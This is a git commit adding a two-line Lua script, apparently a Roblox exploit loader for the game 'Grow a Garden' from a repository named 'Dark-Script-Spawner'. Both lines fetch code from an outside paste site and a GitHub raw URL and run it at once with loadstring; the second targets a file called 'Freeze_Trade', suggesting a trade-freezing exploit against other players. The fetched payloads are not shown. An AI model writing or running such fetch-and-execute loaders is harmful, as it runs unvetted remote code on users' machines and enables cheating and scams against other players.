06eccde1fe07c8c0c33b0a20e4f31d74070f32e3
JandelDupes <arisetusk@gmail.com>
2025-08-06 08:10:59 +0800

    Create script.lua

---
+++ script.lua
@@ -0,0 +1,3 @@
+loadstring(game:HttpGet("https://pastefy.app/UI0CZv2e/raw"))()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/JandelDupes/Grow-A-Garden-Dark-Script-Spawner/refs/heads/main/Freeze_Trade", true))()
